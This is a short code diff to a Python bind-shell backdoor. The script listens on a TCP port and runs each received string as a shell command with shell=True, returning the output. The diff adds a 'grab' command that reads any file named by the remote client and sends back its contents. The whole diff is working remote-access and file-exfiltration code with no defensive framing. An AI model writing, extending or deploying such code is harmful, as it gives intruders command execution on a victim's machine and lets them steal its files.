@@ -19,6 +19,11 @@ else:
     PORT = 5000
 
 
+def grab(file_name):
+    try:
+        return open(file_name, "rb").read()
+    except:
+        return ''
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((HOST, PORT))
 s.listen(1)
@@ -31,12 +36,16 @@ while 1:
     if data == "exit":
         conn.sendall(data)
         break
+
     try:
-        out = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
-        if not out:
-            out = "Done."
-        if data.split()[0] == "cd":
-            os.chdir(data.split()[1])
+        if data.split()[0] == "grab":
+            out = grab(data.split()[1])
+        else:
+            out = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
+            if not out:
+                out = "Done."
+            if data.split()[0] == "cd":
+                os.chdir(data.split()[1])
     except Exception, e:
         out = str(e.output)
     conn.sendall(out)
